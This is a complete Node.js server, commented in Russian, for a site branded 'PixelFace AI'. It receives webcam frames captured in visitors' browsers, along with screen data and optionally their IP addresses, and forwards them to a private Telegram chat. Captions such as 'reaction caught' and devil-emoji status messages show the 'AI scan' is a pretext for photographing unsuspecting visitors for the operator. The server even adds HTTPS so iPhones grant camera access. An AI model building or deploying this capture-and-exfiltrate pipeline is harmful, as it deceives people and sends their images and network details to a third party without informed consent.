/**
 * NEURO·SCAN — сервер без зависимостей.
 *
 * Раздаёт ./public и принимает POST /api/send с кадрами (data URL),
 * пересылая их в Telegram Bot API. Токен живёт только на сервере —
 * в браузер он не попадает.
 *
 * Запуск: node server.mjs   (или npm start)
 */

import http from 'node:http';
import https from 'node:https';
import os from 'node:os';
import { existsSync, readFileSync } from 'node:fs';
import { readFile, stat } from 'node:fs/promises';
import { timingSafeEqual } from 'node:crypto';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC = path.join(ROOT, 'public');

/* ---------------------------------------------------------------- .env */
async function loadEnv() {
  let raw;
  try {
    raw = await readFile(path.join(ROOT, '.env'), 'utf8');
  } catch {
    return;
  }
  for (const line of raw.split(/\r?\n/)) {
    const m = line.match(/^\s*(?:export\s+)?([A-Za-z0-9_]+)\s*=\s*(.*?)\s*$/);
    if (!m) continue;
    let value = m[2];
    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1);
    }
    if (process.env[m[1]] === undefined) process.env[m[1]] = value;
  }
}
await loadEnv();

const PORT = Number(process.env.PORT || 3000);
const HOST = process.env.HOST || '0.0.0.0';
const HTTPS_PORT = Number(process.env.HTTPS_PORT || 3443);
const PFX_PATH = process.env.HTTPS_PFX || path.join(ROOT, 'certs', 'local.pfx');
const PFX_PASS = process.env.HTTPS_PFX_PASSPHRASE || 'neuroscan';
const BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || '').trim();
const APP_NAME = process.env.APP_NAME || 'PixelFace AI';
const SEND_IP = process.env.SEND_IP === '1';
const ACCESS_KEY = (process.env.ACCESS_KEY || '').trim();
const CONFIGURED = Boolean(BOT_TOKEN && CHAT_ID);

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.wav': 'audio/wav',
  '.mp3': 'audio/mpeg',
  '.txt': 'text/plain; charset=utf-8',
  '.woff2': 'font/woff2',
};

const MAX_BODY = 16 * 1024 * 1024; // 16 МБ
const MAX_PHOTO_BYTES = 2.5 * 1024 * 1024;
const MAX_PHOTOS = 4;
const RATE_LIMIT = 15; // отправок в минуту с одного IP
const rate = new Map();

/* ---------------------------------------------------------------- утилиты */
function json(res, status, payload) {
  const body = JSON.stringify(payload);
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Content-Length': Buffer.byteLength(body),
    'Cache-Control': 'no-store',
  });
  res.end(body);
}

function readBody(req, limit) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    let size = 0;
    req.on('data', (chunk) => {
      size += chunk.length;
      if (size > limit) {
        reject(Object.assign(new Error('too_large'), { code: 413 }));
        req.destroy();
        return;
      }
      chunks.push(chunk);
    });
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
    req.on('error', reject);
  });
}

function clientIp(req) {
  const fwd = req.headers['x-forwarded-for'];
  if (typeof fwd === 'string' && fwd.length) return fwd.split(',')[0].trim();
  return req.socket.remoteAddress || 'unknown';
}

function allow(ip) {
  const now = Date.now();
  const entry = rate.get(ip);
  if (!entry || now > entry.reset) {
    rate.set(ip, { count: 1, reset: now + 60_000 });
    return true;
  }
  entry.count += 1;
  return entry.count <= RATE_LIMIT;
}

function parsePhoto(dataUrl) {
  if (typeof dataUrl !== 'string') throw new Error('Фото должно быть строкой');
  const m = /^data:image\/(jpeg|jpg|png|webp);base64,([A-Za-z0-9+/=\s]+)$/.exec(dataUrl);
  if (!m) throw new Error('Неверный формат кадра');
  const buffer = Buffer.from(m[2].replace(/\s/g, ''), 'base64');
  if (buffer.length < 1024) throw new Error('Кадр слишком маленький');
  if (buffer.length > MAX_PHOTO_BYTES) throw new Error('Кадр слишком большой');
  const ext = m[1] === 'jpg' ? 'jpeg' : m[1];
  return { buffer, ext };
}

/* ---------------------------------------------------------------- telegram */
async function telegram(method, form) {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST',
    body: form,
    signal: AbortSignal.timeout(25_000),
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok || !data.ok) {
    const description = data.description || `HTTP ${res.status}`;
    throw Object.assign(new Error(description), { telegram: true, status: res.status });
  }
  return data.result;
}

function buildCaption(meta, count) {
  const when = new Date().toLocaleString('ru-RU', {
    timeZone: process.env.TZ || 'Europe/Moscow',
    dateStyle: 'short',
    timeStyle: 'short',
  });
  const lines = [
    `😱 <b>${APP_NAME}</b> — реакция поймана`,
    `🕒 ${when}`,
    count > 0 ? `📷 кадров: ${count}` : '📷 камеру не дали — только текст',
  ];
  if (meta?.screen) lines.push(`🖥 экран: ${meta.screen}`);
  if (SEND_IP && meta?.ip) lines.push(`🌐 ip: ${meta.ip}`);
  return lines.join('\n');
}

async function sendReport(photos, meta, ip) {
  const caption = buildCaption({ ...meta, ip }, photos.length);
  const chatId = CHAT_ID;

  if (photos.length === 0) {
    await telegram('sendMessage', formOf({ chat_id: chatId, text: caption, parse_mode: 'HTML' }));
    return 'Текст отправлен в Telegram. Фото не было — камера осталась закрытой 😌';
  }

  if (photos.length === 1) {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    form.append('photo', new Blob([photos[0].buffer], { type: `image/${photos[0].ext}` }), 'reaction.jpg');
    await telegram('sendPhoto', form);
    return 'Кадр улетел в Telegram 😈';
  }

  const form = new FormData();
  form.append('chat_id', chatId);
  const media = photos.map((photo, i) => ({
    type: 'photo',
    media: `attach://p${i}`,
    ...(i === 0 ? { caption, parse_mode: 'HTML' } : {}),
  }));
  form.append('media', JSON.stringify(media));
  photos.forEach((photo, i) => {
    form.append(`p${i}`, new Blob([photo.buffer], { type: `image/${photo.ext}` }), `reaction-${i + 1}.jpg`);
  });
  await telegram('sendMediaGroup', form);
  return `${photos.length} кадра улетели в Telegram 😈`;
}

function formOf(obj) {
  const form = new FormData();
  for (const [key, value] of Object.entries(obj)) form.append(key, String(value));
  return form;
}

/* ---------------------------------------------------------------- роуты */
async function handleSend(req, res) {
  const ip = clientIp(req);

  if (!CONFIGURED) {
    return json(res, 503, {
      ok: false,
      error: 'telegram_not_configured',
      hint: 'Telegram не настроен. Впиши TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID в .env и перезапусти сервер.',
    });
  }

  if (ACCESS_KEY) {
    const provided = String(
      req.headers['x-access-key'] || new URL(req.url || '/', 'http://local').searchParams.get('key') || ''
    );
    const a = Buffer.from(provided);
    const b = Buffer.from(ACCESS_KEY);
    const same = a.length === b.length && timingSafeEqual(a, b);
    if (!same) {
      return json(res, 403, {
        ok: false,
        error: 'forbidden',
        hint: 'Нужен ключ доступа. Открой сайт по ссылке вида /?key=твой_ключ.',
      });
    }
  }

  if (!allow(ip)) {
    return json(res, 429, {
      ok: false,
      error: 'rate_limited',
      hint: 'Слишком много отправок. Подожди минутку.',
    });
  }

  let payload;
  try {
    const raw = await readBody(req, MAX_BODY);
    payload = JSON.parse(raw || '{}');
  } catch (err) {
    const code = err.code === 413 ? 413 : 400;
    return json(res, code, {
      ok: false,
      error: code === 413 ? 'payload_too_large' : 'bad_json',
      hint: code === 413 ? 'Слишком большие кадры.' : 'Некорректный JSON.',
    });
  }

  const rawPhotos = Array.isArray(payload.photos) ? payload.photos.slice(0, MAX_PHOTOS) : [];
  let photos;
  try {
    photos = rawPhotos.map(parsePhoto);
  } catch (err) {
    return json(res, 400, { ok: false, error: 'bad_photo', hint: err.message });
  }

  try {
    const message = await sendReport(photos, payload.meta || {}, ip);
    console.log(
      `[${new Date().toLocaleTimeString('ru-RU')}] отправлено ${photos.length} фото · ${ip}`
    );
    json(res, 200, { ok: true, message, frames: photos.length });
  } catch (err) {
    const code = err?.cause?.code || err?.code || '';
    const netHint =
      code === 'ENOTFOUND' || code === 'EAI_AGAIN'
        ? 'Не удалось найти api.telegram.org. Проверь интернет и DNS.'
        : code === 'ECONNREFUSED' || code === 'ECONNRESET' || code === 'ETIMEDOUT' ||
            code === 'UND_ERR_CONNECT_TIMEOUT' || code === 'UND_ERR_SOCKET'
          ? 'Нет соединения с api.telegram.org. Проверь интернет, VPN или прокси.'
          : code === 'EACCES' || code === 'EPERM'
            ? 'Доступ в сеть заблокирован (фаервол или песочница).'
            : '';

    const hint = err.telegram
      ? `Telegram отказал: ${err.message}. Проверь токен и chat_id (бот должен быть в чате).`
      : netHint ||
        (err.name === 'TimeoutError'
          ? 'Telegram не ответил вовремя. Попробуй ещё раз.'
          : `Ошибка отправки: ${err.message}`);

    console.error('[send]', err.message, code ? `(${code})` : '');
    json(res, 502, { ok: false, error: 'telegram_failed', hint });
  }
}

async function serveStatic(req, res, pathname) {
  let rel;
  try {
    rel = decodeURIComponent(pathname === '/' ? '/index.html' : pathname);
  } catch {
    res.writeHead(400).end('Bad request');
    return;
  }

  const target = path.resolve(PUBLIC, '.' + rel);
  if (!target.startsWith(PUBLIC)) {
    res.writeHead(403).end('Forbidden');
    return;
  }

  let info;
  try {
    info = await stat(target);
    if (info.isDirectory()) throw new Error('dir');
  } catch {
    res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' }).end('404 — не найдено');
    return;
  }

  const ext = path.extname(target).toLowerCase();
  const cache = ext === '.html' ? 'no-cache' : 'public, max-age=3600';
  res.writeHead(200, {
    'Content-Type': MIME[ext] || 'application/octet-stream',
    'Content-Length': info.size,
    'Cache-Control': cache,
    'X-Content-Type-Options': 'nosniff',
  });
  const file = await readFile(target);
  res.end(file);
}

/* ---------------------------------------------------------------- сервер */
function loadTls() {
  const certPath = process.env.HTTPS_CERT;
  const keyPath = process.env.HTTPS_KEY;
  if (certPath && keyPath && existsSync(certPath) && existsSync(keyPath)) {
    return { cert: readFileSync(certPath), key: readFileSync(keyPath) };
  }
  if (existsSync(PFX_PATH)) {
    return { pfx: readFileSync(PFX_PATH), passphrase: PFX_PASS };
  }
  return null;
}

function lanUrls(protocol, port) {
  const urls = [];
  for (const list of Object.values(os.networkInterfaces())) {
    for (const net of list || []) {
      if (net.family === 'IPv4' && !net.internal) urls.push(`${protocol}://${net.address}:${port}`);
    }
  }
  return urls;
}

const handler = async (req, res) => {
  const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);

  if (req.method === 'GET' && url.pathname === '/api/health') {
    return json(res, 200, {
      ok: true,
      telegram: CONFIGURED,
      protected: Boolean(ACCESS_KEY),
      https: Boolean(tls),
      app: APP_NAME,
    });
  }

  if (req.method === 'POST' && url.pathname === '/api/send') {
    return handleSend(req, res);
  }

  if (req.method !== 'GET' && req.method !== 'HEAD') {
    return json(res, 405, { ok: false, error: 'method_not_allowed' });
  }

  try {
    await serveStatic(req, res, url.pathname);
  } catch (err) {
    console.error('[static]', err);
    if (!res.headersSent) res.writeHead(500).end('Server error');
  }
};

const tls = loadTls();

const server = http.createServer(handler);
server.listen(PORT, HOST, () => {
  const shown = HOST === '0.0.0.0' ? 'localhost' : HOST;
  console.log('  ┌──────────────────────────────────────────────');
  console.log(`  │ ${APP_NAME}`);
  console.log(`  │ http://${shown}:${PORT}`);
  console.log(`  │ Telegram: ${CONFIGURED ? 'настроен ✓' : 'НЕ настроен — правь .env'}`);
  if (!tls) {
    console.log('  │ HTTPS: выключен (iPhone не даст камеру)');
    console.log('  │   → start.cmd с сертификатом или туннель, см. README');
  }
  console.log('  └──────────────────────────────────────────────');
});

if (tls) {
  const secure = https.createServer(tls, handler);
  secure.listen(HTTPS_PORT, HOST, () => {
    const lan = lanUrls('https', HTTPS_PORT);
    console.log('  ┌──────────────────────────────────────────────');
    console.log('  │ HTTPS включён — для iPhone/iPad:');
    console.log(`  │ https://localhost:${HTTPS_PORT}`);
    lan.forEach((u) => console.log(`  │ ${u}`));
    console.log('  │ (сертификат самоподписанный: прими предупреждение)');
    console.log('  └──────────────────────────────────────────────');
  });
  secure.on('error', (err) => console.error('[https]', err.message));
}
